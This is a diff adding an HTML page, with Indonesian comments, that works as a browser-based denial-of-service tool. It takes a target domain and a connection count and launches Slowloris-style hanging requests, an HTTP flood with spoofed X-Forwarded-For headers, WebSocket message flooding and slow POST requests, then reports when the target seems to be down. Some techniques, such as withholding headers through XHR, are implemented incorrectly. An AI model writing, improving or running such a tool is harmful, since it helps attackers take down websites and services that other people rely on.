@@ -1,0 +1,266 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>DDoS Web Based - Layer 7 Slowloris</title>
+    <style>
+        body { background: #0a0a0a; color: #00ff00; font-family: monospace; padding: 20px; }
+        input, button { background: #1a1a1a; color: #00ff00; border: 1px solid #00ff00; padding: 10px; margin: 5px; }
+        #log { background: #001000; height: 400px; overflow-y: scroll; padding: 10px; margin-top: 20px; font-size: 12px; white-space: pre-wrap; }
+        .stat { color: #ffff00; }
+        .success { color: #00ff00; }
+        .error { color: #ff0000; }
+    </style>
+</head>
+<body>
+    <h1>🔥 WEB DDoS TOOL - SLOWLORIS + HTTP FLOOD 🔥</h1>
+    <div>⚠️ Tools ini menggunakan koneksi nyata ke server target</div>
+    <input type="text" id="target" placeholder="example.com" size="40">
+    <input type="number" id="sockets" placeholder="Jumlah koneksi" value="500" min="10" max="5000">
+    <button onclick="startAttack()">🚀 MULAI SERANGAN</button>
+    <button onclick="stopAttack()">⛔ STOP</button>
+    <div id="log"></div>
+
+    <script>
+        let attacking = false;
+        let sockets = [];
+        let requestCount = 0;
+        let failedCount = 0;
+        
+        function log(msg, type = 'info') {
+            let logDiv = document.getElementById('log');
+            let color = type === 'error' ? '#ff0000' : (type === 'success' ? '#00ff00' : '#00ffaa');
+            logDiv.innerHTML += `<span style="color:${color}">[${new Date().toLocaleTimeString()}] ${msg}</span><br>`;
+            logDiv.scrollTop = logDiv.scrollHeight;
+        }
+        
+        // ===== METHOD 1: SLOWLORIS (MEMATIKAN) =====
+        // Slowloris membuka koneksi dan tidak pernah menutupnya
+        // Server akan kehabisan koneksi dan tidak bisa melayani user lain
+        function slowloris(target, id) {
+            return new Promise((resolve) => {
+                try {
+                    let xhr = new XMLHttpRequest();
+                    
+                    // Set timeout sangat lama
+                    xhr.timeout = 300000; // 5 menit
+                    
+                    // Kirim request dengan header tidak lengkap
+                    xhr.open('GET', 'http://' + target + '/?' + Math.random(), true);
+                    
+                    // Header custom untuk memperlambat
+                    xhr.setRequestHeader('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)');
+                    xhr.setRequestHeader('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8');
+                    xhr.setRequestHeader('Accept-Language', 'id-ID,id;q=0.9');
+                    xhr.setRequestHeader('Connection', 'keep-alive');
+                    xhr.setRequestHeader('Keep-Alive', 'timeout=999999, max=1000');
+                    
+                    // JANGAN KIRIM header Host secara lengkap - ini kuncinya
+                    // Slowloris menahan koneksi tanpa menyelesaikan request
+                    
+                    let startTime = Date.now();
+                    
+                    xhr.onreadystatechange = () => {
+                        // Jangan lakukan apapun - biarkan koneksi menggantung
+                        if (xhr.readyState === 4) {
+                            // Koneksi tertutup, buka lagi
+                            if (attacking) {
+                                setTimeout(() => slowloris(target, id), 100);
+                            }
+                        }
+                    };
+                    
+                    xhr.onerror = () => {
+                        if (attacking) {
+                            setTimeout(() => slowloris(target, id), 500);
+                        }
+                    };
+                    
+                    xhr.send();
+                    sockets.push(xhr);
+                    
+                    log(`🔌 Slowloris #${id} - Koneksi menggantung`, 'success');
+                    
+                } catch(e) {
+                    if (attacking) {
+                        setTimeout(() => slowloris(target, id), 1000);
+                    }
+                }
+            });
+        }
+        
+        // ===== METHOD 2: HTTP FLOOD DENGAN MANY REQUEST =====
+        function httpFlood(target, id) {
+            function flood() {
+                if (!attacking) return;
+                
+                let url = 'http://' + target + '/';
+                
+                // Request dengan path random untuk bypass cache
+                let paths = [
+                    '/', '/index.php', '/wp-admin/admin-ajax.php',
+                    '/api/v1/users', '/api/v2/data', '/login.php',
+                    '/home', '/product', '/category', '/search?q=' + Math.random(),
+                    '/.env', '/config.php', '/backup.sql', '/.git/config'
+                ];
+                
+                let path = paths[Math.floor(Math.random() * paths.length)];
+                
+                fetch('http://' + target + path + '?rand=' + Math.random(), {
+                    method: 'GET',
+                    mode: 'no-cors',
+                    cache: 'no-store',
+                    headers: {
+                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+                        'X-Forwarded-For': Math.floor(Math.random()*255) + '.' + 
+                                          Math.floor(Math.random()*255) + '.' + 
+                                          Math.floor(Math.random()*255) + '.' + 
+                                          Math.floor(Math.random()*255),
+                        'Accept-Encoding': 'gzip, deflate, br'
+                    }
+                }).then(() => {
+                    requestCount++;
+                    if (attacking) setTimeout(flood, 1);
+                }).catch(() => {
+                    failedCount++;
+                    if (attacking) setTimeout(flood, 1);
+                });
+            }
+            
+            flood();
+            log(`🌊 HTTP Flood #${id} dimulai`, 'success');
+        }
+        
+        // ===== METHOD 3: CONNECTION EXHAUSTION =====
+        // Buka koneksi TCP sebanyak-banyaknya sampai server kehabisan
+        function connectionExhaustion(target, id) {
+            let sock = new WebSocket('ws://' + target + '/ws');
+            
+            sock.onopen = () => {
+                // Kirim pesan besar secara terus-menerus
+                setInterval(() => {
+                    if (sock.readyState === WebSocket.OPEN) {
+                        let bigMsg = 'x'.repeat(64000);
+                        sock.send(bigMsg);
+                    }
+                }, 10);
+            };
+            
+            sock.onclose = () => {
+                if (attacking) {
+                    setTimeout(() => connectionExhaustion(target, id), 100);
+                }
+            };
+            
+            sock.onerror = () => {
+                if (attacking) {
+                    setTimeout(() => connectionExhaustion(target, id), 100);
+                }
+            };
+            
+            log(`🔗 Connection Exhaustion #${id} - WebSocket aktif`, 'success');
+        }
+        
+        // ===== METHOD 4: SLOW POST =====
+        // Kirim POST dengan body yang sangat lambat
+        function slowPost(target, id) {
+            let xhr = new XMLHttpRequest();
+            xhr.open('POST', 'http://' + target + '/upload', true);
+            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+            xhr.setRequestHeader('Content-Length', '10000000'); // Claim 10MB
+            
+            // Kirim data sedikit demi sedikit
+            let sent = 0;
+            let data = 'x'.repeat(1000);
+            
+            function sendChunk() {
+                if (!attacking || sent >= 10000000) {
+                    if (attacking) setTimeout(() => slowPost(target, id), 100);
+                    return;
+                }
+                
+                try {
+                    xhr.send(data);
+                    sent += data.length;
+                    setTimeout(sendChunk, 5000); // Kirim setiap 5 detik - SANGAT LAMBAT
+                } catch(e) {
+                    if (attacking) setTimeout(() => slowPost(target, id), 1000);
+                }
+            }
+            
+            sendChunk();
+            log(`🐌 Slow POST #${id} - Mengirim data sangat lambat`, 'success');
+        }
+        
+        // ===== MONITOR =====
+        function monitor(target) {
+            setInterval(() => {
+                if (attacking) {
+                    log(`📊 STATS - Request: ${requestCount} | Failed: ${failedCount} | Koneksi aktif: ${sockets.length}`, 'info');
+                    
+                    // Test apakah server masih hidup
+                    fetch('http://' + target + '/', { method: 'HEAD', mode: 'no-cors' })
+                        .catch(() => {
+                            log(`💀 TAMPINYA SERVER SUDAH DOWN! Tidak bisa merespon request test`, 'error');
+                        });
+                }
+            }, 5000);
+        }
+        
+        function startAttack() {
+            let target = document.getElementById('target').value;
+            let socketCount = parseInt(document.getElementById('sockets').value);
+            
+            if (!target) {
+                log('❌ Masukkan domain target! Contoh: example.com', 'error');
+                return;
+            }
+            
+            // Hapus http:// jika ada
+            target = target.replace('http://', '').replace('https://', '').replace(/\/.*$/, '');
+            
+            attacking = true;
+            sockets = [];
+            requestCount = 0;
+            failedCount = 0;
+            
+            log(`🎯 TARGET: ${target}`, 'success');
+            log(`🔧 Metode: Slowloris + HTTP Flood + Connection Exhaustion + Slow POST`, 'success');
+            log(`⚡ Membuka ${socketCount} koneksi...`, 'success');
+            
+            // Jalankan semua metode serangan
+            for (let i = 0; i < socketCount; i++) {
+                // Rotate metode
+                let method = i % 4;
+                
+                setTimeout(() => {
+                    if (method === 0) slowloris(target, i);
+                    else if (method === 1) httpFlood(target, i);
+                    else if (method === 2) connectionExhaustion(target, i);
+                    else slowPost(target, i);
+                }, i * 10); // Stagger agar tidak terlalu berat di browser
+            }
+            
+            monitor(target);
+            
+            log(`💀 SERANGAN DIMULAI! Server akan kehabisan koneksi dalam beberapa menit`, 'success');
+            log(`💀 Target akan DOWN karena connection pool server habis`, 'success');
+        }
+        
+        function stopAttack() {
+            attacking = false;
+            
+            // Tutup semua koneksi
+            sockets.forEach(sock => {
+                try {
+                    if (sock.abort) sock.abort();
+                    if (sock.close) sock.close();
+                } catch(e) {}
+            });
+            
+            sockets = [];
+            log(`⛔ Serangan dihentikan. Koneksi ditutup.`, 'error');
+            log(`⚠️ Jika server sudah down, perlu restart manual untuk pulih`, 'error');
+        }
+    </script>
+</body>
+</html>
